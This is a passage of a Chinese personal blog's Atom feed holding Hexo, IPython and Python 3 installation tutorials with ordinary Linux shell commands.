title="编写Blog"></a>编写Blog</h4><p>执行下列命令来创建一篇新文章或者新的页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;hexo&quot;</span><br></pre></td></tr></table></figure><blockquote><p>您可以在命令中指定文章的布局（layout），默认为 post，可以通过修改 _config.yml 中的 default_layout 参数来指定默认布局。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vim source/_post/hexo</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: hexo——轻量、简易的博客</span><br><span class="line">date: 2019-10-12 14:40:46</span><br><span class="line">tags: </span><br><span class="line">  - Hexo</span><br><span class="line">  - 教程</span><br><span class="line">categories:</span><br><span class="line">  - Hexo</span><br><span class="line">  - 教程</span><br><span class="line">keywords: &quot;Hexo,Blog,Linux&quot;</span><br><span class="line">top_img:</span><br><span class="line">cover: https://i.loli.net/2019/10/12/gye1tIzLdiuwX2S.jpg</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">Hello word</span><br></pre></td></tr></table></figure><h4 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h4><h5 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h5><p>安装 <a href="https://github.com/hexojs/hexo-deployer-git" target="_blank" rel="noopener">hexo-deployer-git</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>创建<a href="https://github.com" target="_blank" rel="noopener">Github</a>项目:</p><p><img alt data-src="https://p.pstatp.com/origin/ffb8000051e98820be1e" class="lozad"></p><p>设置项目:</p><p><img alt data-src="https://p.pstatp.com/origin/ff970000c37f1291de70" class="lozad"></p><p>在开始之前，您必须先在 <code>_config.yml</code> 中修改参数，一个正确的部署配置中至少要有 <code>type</code> 参数，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:  </span><br><span class="line">type: git</span><br><span class="line">repo: </span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>repo</td><td>库（Repository）地址</td></tr><tr><td>branch</td><td>分支名称。如果不指定，则默认值为 master</td></tr><tr><td>message</td><td>自定义提交信息</td></tr></tbody></table><p>Hexo 提供了快速方便的一键部署功能，只需一条命令就能将网站部署到服务器上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/categories/Hexo/"/>
    
      <category term="教程" scheme="https://gz1903.github.io/categories/Hexo/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/tags/Hexo/"/>
    
      <category term="教程" scheme="https://gz1903.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Linux安装Ipython 交互式解释器</title>
    <link href="https://gz1903.github.io/2019/10/09/Linux%E5%AE%89%E8%A3%85Ipython-%E4%BA%A4%E4%BA%92%E5%BC%8F%E8%A7%A3%E9%87%8A%E5%99%A8/"/>
    <id>https://gz1903.github.io/2019/10/09/Linux安装Ipython-交互式解释器/</id>
    <published>2019-10-09T00:43:53.000Z</published>
    <updated>2019-10-28T03:42:50.159Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="Ipython-简介"><a href="#Ipython-简介" class="headerlink" title="Ipython 简介"></a>Ipython 简介</h3><p><strong>IPython外加一个文本编辑器</strong></p><p>Windows系统下是IPython加notepad++，Linux系统下是IPython加vim配合使用，写起代码来体验很流畅，很容易获取到写代码时候的那种“流体验”。</p><p>IPython的设计目的是在交互式计算和软件开发这两个方面最大化地提高生产力，它鼓励一种“执行-探索”的工作模式，支持matplotlib等库的绘图操作。同时IPython还提供一个基于WEB的交互式浏览器开发环境（Jupyter Notebook），用起来也很不错。</p><h3 id="配置使用国内源安装第三方模块"><a href="#配置使用国内源安装第三方模块" class="headerlink" title="配置使用国内源安装第三方模块"></a>配置使用国内源安装第三方模块</h3><h4 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h4><p>配置 pip3 使用国内源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.pip</span><br><span class="line">vi ~/.pip/pip.conf</span><br><span class="line"><span class="comment"># Windows 下使用 pip.ini</span></span><br></pre></td></tr></table></figure><p>写入如下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url=https://mirrors.aliyun.com/pypi/simple</span><br></pre></td></tr></table></figure><blockquote><p><code>豆瓣源: https://pypi.douban.com/simple/</code></p><p><code>阿里源: https://mirrors.aliyun.com/pypi/simple</code></p><p><code>清华: https://pypi.tuna.tsinghua.edu.cn/simple</code></p><p><code>阿里云: http://mirrors.aliyun.com/pypi/simple/</code></p><p><code>中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</code></p><p><code>华中理工大学: http://pypi.hustunique.com/</code></p><p><code>山东理工大学: http://pypi.sdutlinux.org/</code></p></blockquote><p>示例：<br> 比如安装一个执行远程主机命令的模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@newrain ~]<span class="comment"># pip3 install paramiko</span></span><br><span class="line">Collecting paramiko</span><br><span class="line">  Downloading https://mirrors.aliyun.com/pypi/packages/4b/80/74dace9e48b0ef923633dfb5e48798f58a168e4734bca8ecfaf839ba051a/paramiko-2.6.0-py2.py3-none-any.whl (199kB)</span><br><span class="line">    100% |████████████████████████████████| 204kB 2.3MB/s </span><br><span class="line">Collecting bcrypt&gt;=3.1.3 (from paramiko)</span><br><span class="line">  Downloading https://mirrors.aliyun.com/pypi/packages/8b/1d/82826443777dd4a624e38a08957b975e75df859b381ae302cfd7a30783ed/bcrypt-3.1.7-cp34-abi3-manylinux1_x86_64.whl (56kB)</span><br><span class="line">    100% |████████████████████████████████| 61kB 3.1MB/s </span><br><span class="line">Collecting pynacl&gt;=1.0.1 (from paramiko)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="安装-Ipython"><a href="#安装-Ipython" class="headerlink" title="安装 Ipython"></a>安装 Ipython</h3><h4 id="安装-python-devel"><a href="#安装-python-devel" class="headerlink" title="安装 python-devel"></a>安装 python-devel</h4><p>​         python-dev或python-devel称为是python的开发包，其中包括了一些用C/Java/C#等编写的python扩展在编译的时候依赖的头文件等信息。</p><p>比如：我们在编译一个用C语言编写的python扩展模块时，因为里面会有#include&lt;Python.h&gt;等这样的语句，因此我们就需要先安装python-devel开发包</p><p>执行以下命令安装即可（需要有 epel 源支持）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install python-devel</span><br></pre></td></tr></table></figure><h4 id="安装-ipython"><a href="#安装-ipython" class="headerlink" title="安装 ipython"></a>安装 ipython</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ipython</span><br></pre></td></tr></table></figure><h4 id="启动-ipython"><a href="#启动-ipython" class="headerlink" title="启动 ipython"></a>启动 ipython</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@nginx2-8 ~]<span class="comment"># ipython</span></span><br><span class="line">Python 3.7.3 (default, Oct  8 2019, 15:49:02) </span><br><span class="line">Type <span class="string">'copyright'</span>, <span class="string">'credits'</span> or <span class="string">'license'</span> <span class="keyword">for</span> more information</span><br><span class="line">IPython 7.8.0 -- An enhanced Interactive Python. Type <span class="string">'?'</span> <span class="keyword">for</span> <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line">In [1]:</span><br></pre></td></tr></table></figure><p>当pip安装ipython, bpython后, 直接执行ipython or bpython会报错：*python: command not found</p><h3 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h3><p>环境变量问题，设置别名就好。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="built_in">alias</span> ipython=``<span class="string">'python3 -m IPython'</span>``<span class="built_in">alias</span> bpython=``<span class="string">'python3 -m bpython'</span>`</span><br></pre></td></tr></table></figure><h4 id="退出-ipython"><a href="#退出-ipython" class="headerlink" title="退出 ipython"></a>退出 ipython</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@nginx2-8 ~]<span class="comment"># ipython</span></span><br><span class="line">Python 3.7.3 (default, Oct  8 2019, 15:49:02) </span><br><span class="line">Type <span class="string">'copyright'</span>, <span class="string">'credits'</span> or <span class="string">'license'</span> <span class="keyword">for</span> more information</span><br><span class="line">IPython 7.8.0 -- An enhanced Interactive Python. Type <span class="string">'?'</span> <span class="keyword">for</span> <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line">In [1]: <span class="built_in">exit</span>                                                                                                           </span><br><span class="line">[root@nginx2-8 ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/fe5a0000dc60465ac271" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Python" scheme="https://gz1903.github.io/categories/Python/"/>
    
      <category term="教程" scheme="https://gz1903.github.io/categories/Python/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://gz1903.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
      <category term="Linux" scheme="https://gz1903.github.io/tags/Linux/"/>
    
      <category term="Python" scheme="https://gz1903.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Linux 编译安装Python3</title>
    <link href="https://gz1903.github.io/2019/10/08/Linux-%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Python3/"/>
    <id>https://gz1903.github.io/2019/10/08/Linux-编译安装Python3/</id>
    <published>2019-10-08T12:05:49.000Z</published>
    <updated>2019-10-28T03:42:50.251Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="安装依赖软件包"><a href="#安装依赖软件包" class="headerlink" title="安装依赖软件包"></a>安装依赖软件包</h3><h4 id="centos里面是-devel，如果在ubuntu下安装则要改成-dev，依赖包缺一不可"><a href="#centos里面是-devel，如果在ubuntu下安装则要改成-dev，依赖包缺一不可" class="headerlink" title="centos里面是-devel，如果在ubuntu下安装则要改成-dev，依赖包缺一不可."></a><strong>centos里面是-devel，如果在ubuntu下安装则要改成-dev，依赖包缺一不可.</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y groupinstall <span class="string">"Development tools"</span></span><br><span class="line">yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel libffi-devel</span><br></pre></td></tr></table></figure><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -o python3.7.tgz https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tgz</span><br><span class="line">// 或者</span><br><span class="line">wget  https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tgz</span><br></pre></td></tr></table></figure><h3 id="解压安装"><a href="#解压安装" class="headerlink" title="解压安装"></a>解压安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -xf Python-3.7.0.tgz</span><br><span class="line"><span class="built_in">cd</span> Python-3.7.0/</span><br></pre></td></tr></table></figure><h3 id="进入目录后，执行下面的命令"><a href="#进入目录后，执行下面的命令" class="headerlink" title="进入目录后，执行下面的命令"></a><strong>进入目录后，执行下面的命令</strong></h3><p>修改文件 <code>Python-3.7.0/Modules/Setup.dist</code>， 去掉如下几行的注释 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">readline readline.c -lreadline -ltermcap</span><br><span class="line"></span><br><span class="line">SSL=/usr/<span class="built_in">local</span>/ssl</span><br><span class="line">_ssl _ssl.c \</span><br><span class="line">        -DUSE_SSL -I$(SSL)/include -I$(SSL)/include/openssl \</span><br><span class="line">        -L$(SSL)/lib -lssl -lcrypto</span><br></pre></td></tr></table></figure><h4 id="或者在-shell-命令提示符下执行如下命令："><a href="#或者在-shell-命令提示符下执行如下命令：" class="headerlink" title="或者在 shell 命令提示符下执行如下命令："></a>或者在 <code>shell</code> 命令提示符下执行如下命令：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed -ri <span class="string">'s/^#readline/readline/'</span> Modules/Setup.dist</span><br><span class="line">sed -ri <span class="string">'s/^#(SSL=)/\1/'</span> Modules/Setup.dist</span><br><span class="line">sed -ri <span class="string">'s/^#(_ssl)/\1/'</span> Modules/Setup.dist </span><br><span class="line">sed -ri <span class="string">'s/^#([\t]*-DUSE)/\1/'</span> Modules/Setup.dist </span><br><span class="line">sed -ri <span class="string">'s/^#([\t]*-L\$\(SSL\))/\1/'</span> Modules/Setup.dist</span><br></pre></td></tr></table></figure><h3 id="开始编译安装"><a href="#开始编译安装" class="headerlink" title="开始编译安装"></a><strong>开始编译安装</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --<span class="built_in">enable</span>-shared --prefix=/usr/<span class="built_in">local</span>/python3</span><br><span class="line">make -j 2 &amp;&amp; make install</span><br></pre></td></tr></table></figure><blockquote><p>–enable-shared 指定安装共享库，共享库在使用其他需调用python的软件时会用到，比如使用<code>mod_wgsi</code> 连接Apache与python时需要。</p></blockquote><h3 id="创建软链接"><a href="#创建软链接" class="headerlink" title="创建软链接"></a>创建软链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/<span class="built_in">local</span>/bin/python3/bin/python3 /usr/bin/python3</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/bin/python3/bin/pip3 /usr/bin/pip3</span><br></pre></td></tr></table></figure><h3 id="配置共享库文件"><a href="#配置共享库文件" class="headerlink" title="配置共享库文件"></a>配置共享库文件</h3><p>为所有用户设置共享库目录</p><p>用 vim 编辑器打开配置文件 <code>/etc/profile.d/python3.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile.d/python3.sh</span><br></pre></td></tr></table></figure><p>在文件末尾写上如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.6 共享库目录</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/python3/bin</span><br></pre></td></tr></table></figure><p>编辑文件 <code>/etc/ld.so.conf.d/python3.conf</code>，并且添加如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/python3/lib</span><br></pre></td></tr></table></figure><p>保存退出文件后， 执行如下命令 加载配置信息使其生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldconfig</span><br></pre></td></tr></table></figure><p>执行如下命令，使环境变量生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile.d/python3.sh</span><br></pre></td></tr></table></figure><h3 id="测试python3"><a href="#测试python3" class="headerlink" title="测试python3"></a>测试python3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python 3.6.3 (default, Dec 17 2017, 04:11:01)</span><br><span class="line">[GCC 4.8.5 20150623 (Red Hat 4.8.5-11)] on linux</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(<span class="string">'qf'</span>)</span><br><span class="line">qf</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exit</span>()</span><br></pre></td></tr></table></figure><blockquote><p>输入 <code>exit()</code> 即可退出 python3</p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/fede000096c7f9decdf1" class="lozad"></p><h3 id="测试-pip3"><a href="#测试-pip3" class="headerlink" title="测试 pip3"></a>测试 pip3</h3><blockquote><p>一般情况下你不需要执行下面的安装命令。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@newrain ~]<span class="comment"># pip3 -V</span></span><br><span class="line">pip 9.0.3 from /usr/<span class="built_in">local</span>/lib/python3.6/site-packages (python 3.6)</span><br></pre></td></tr></table></figure><blockquote><p>假如上面显示的含有 python3.6 就没问题了，说名 pip3 安装的模块会安装到上面显示的目录下</p></blockquote><h3 id="特殊问题"><a href="#特殊问题" class="headerlink" title="特殊问题"></a><strong>特殊问题</strong></h3><p>假如 Python Shell 中敲击方向键显示「[[C[[D」<br> 可以安装以下包</p><blockquote><p>一般情况下你不需要执行下面的安装命令。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install gnureadline</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Python" scheme="https://gz1903.github.io/categories/Python/"/>
    
      <category term="教程" scheme="https://gz1903.github.io/categories/Python/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://gz1903.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
      <category term="Linux" scheme="https://gz1903.github.io/tags/Linux/"/>
    
      <category term="Python" scheme="https://gz1903.github.io/tags/Python/"/>
    
  </entry>
  
</feed>
